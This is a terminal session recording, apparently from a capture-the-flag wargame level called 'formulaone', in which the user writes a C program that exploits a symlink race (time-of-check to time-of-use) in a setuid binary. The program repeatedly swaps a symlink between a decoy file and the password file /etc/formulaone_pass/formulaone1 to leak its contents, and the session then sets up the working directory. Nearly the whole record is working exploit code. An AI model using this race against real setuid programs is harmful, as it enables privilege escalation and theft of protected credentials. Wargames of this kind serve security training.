[7.372956, "o", "\u001b[?2004h\u001b]0;formulaone1@formulaone: ~\u0007formulaone1@formulaone:~$ "]
[22.444259, "o", "cat > /tmp/racer.c <<'CEOF'\r\r\n\u001b[?2004l\r\u001b[?2004h> /* toggle target between decoy and the password file; fork the setuid\r\r\n\u001b[?2004l\r\u001b[?2004h>    binary per round; drain the pipe to EOF so partial decoy reads\r\r\n\u001b[?2004l\r\u001b[?2004h>    (e.g. \"r\") cannot be mistaken for a password hit. */\r\r\n\u001b[?2004l\r\u001b[?2004h> #include <stdio.h>\r\r\n\u001b[?2004l\r\u001b[?2004h> #include <unistd.h>\r\r\n\u001b[?2004l\r\u001b[?2004h> #include <string.h>\r\r\n\u001b[?2004l\r\u001b[?2004h> #include <sys/wait.h>\r\r\n\u001b[?2004l\r\u001b[?2004h> int main(void) {\r\r\n\u001b[?2004l\r\u001b[?2004h>     char out[512];\r\r\n\u001b[?2004l\r\u001b[?2004h>     for (long iter = 0; iter < 200000; iter++) {\r\r\n\u001b[?2004l\r\u001b[?2004h>         unlink(\"target\");\r\r\n\u001b[?2004l\r\u001b[?2004h>         symlink(\"decoy\", \"target\");\r\r\n\u001b[?2004l\r\u001b[?2004h>         pid_t p = fork();\r\r\n\u001b[?2004l\r\u001b[?2004h>         if (p == 0) {\r\r\n\u001b[?2004l\r\u001b[?2004h>             symlink(\"/etc/formulaone_pass/formulaone1\", \"swap_tmp\");\r\r\n\u001b[?2004l\r\u001b[?2004h>             rename(\"swap_tmp\", \"target\");\r\r\n\u001b[?2004l\r\u001b[?2004h>             _exit(0);\r\r\n\u001b[?2004l\r\u001b[?2004h>         }\r\r\n\u001b[?2004l\r\u001b[?2004h>         int fds[2]; pipe(fds);\r\r\n\u001b[?2004l\r\u001b[?2004h>         pid_t q = fork();\r\r\n\u001b[?2004l\r\u001b[?2004h>         if (q == 0) {\r\r\n\u001b[?2004l\r\u001b[?2004h>             dup2(fds[1], 1); close(fds[0]); close(fds[1]);\r\r\n\u001b[?2004l\r\u001b[?2004h>             execl(\"/formulaone/formulaone1\", \"formulaone1\", \"target\", (char*)0);\r\r\n\u001b[?2004l\r\u001b[?2004h>             _exit(127);\r\r\n\u001b[?2004l\r\u001b[?2004h>         }\r\r\n\u001b[?2004l\r\u001b[?2004h>         close(fds[1]);\r\r\n\u001b[?2004l\r\u001b[?2004h>         int n = 0, t;\r\r\n\u001b[?2004l\r\u001b[?2004h>         while ((t = read(fds[0], out+n, sizeof(out)-1-n)) > 0) n += t;\r\r\n\u001b[?2004l\r\u001b[?2004h>         close(fds[0]);\r\r\n\u001b[?2004l\r\u001b[?2004h>         if (n > 0) {\r\r\n\u001b[?2004l\r\u001b[?2004h>             out[n] = 0;\r\r\n\u001b[?2004l\r\u001b[?2004h>             if (strstr(out, \"readable\") == NULL && strlen(out) > 10) {\r\r\n\u001b[?2004l\r\u001b[?2004h>                 printf(\"HIT iter %ld: %s\\n\", iter, out);\r\r\n\u001b[?2004l\r\u001b[?2004h>                 fflush(stdout);\r\r\n\u001b[?2004l\r\u001b[?2004h>             }\r\r\n\u001b[?2004l\r\u001b[?2004h>         }\r\r\n\u001b[?2004l\r\u001b[?2004h>         waitpid(p, NULL, 0);\r\r\n\u001b[?2004l\r\u001b[?2004h>         waitpid(q, NULL, 0);\r\r\n\u001b[?2004l\r\u001b[?2004h>     }\r\r\n\u001b[?2004l\r\u001b[?2004h>     return 0;\r\r\n\u001b[?2004l\r\u001b[?2004h> }\r\r\n\u001b[?2004l\r\u001b[?2004h> CEOF\r\r\n\u001b[?2004l\r\u001b]3008;start=f899099c-c67d-41cb-bc55-50507e17a504;type=command;machineid=ec21caf08cfdfe937b9cee1512c61281;user=formulaone1;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/home/formulaone1\u001b\\\u001b]3008;end=f899099c-c67d-41cb-bc55-50507e17a504;exit=success\u001b\\\u001b]3008;start=1103e9f1-e467-408a-b4a1-cc8c9697847e;type=shell;machineid=ec21caf08cfdfe937b9cee1512c61281;user=formulaone1;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/home/formulaone1\u001b\\\u001b[?2004h\u001b]0;formulaone1@formulaone: ~\u0007formulaone1@formulaone:~$ "]
[22.624697, "o", "mkdir -p /tmp/race && cd /tmp/race && echo readable > decoy\r\r\n\u001b[?2004l\r"]
[22.628307, "o", "\u001b]3008;start=87467c34-3a95-472d-ab45-9370fa541765;type=command;machineid=ec21caf08cfdfe937b9cee1512c61281;user=formulaone1;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/home/formulaone1\u001b\\"]
[22.629898, "o", "\u001b]3008;end=87467c34-3a95-472d-ab45-9370fa541765;exit=success\u001b\\\u001b]3008;start=1103e9f1-e467-408a-b4a1-cc8c9697847e;type=shell;machineid=ec21caf08cfdfe937b9cee1512c61281;user=formulaone1;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/tmp/race\u001b\\"]
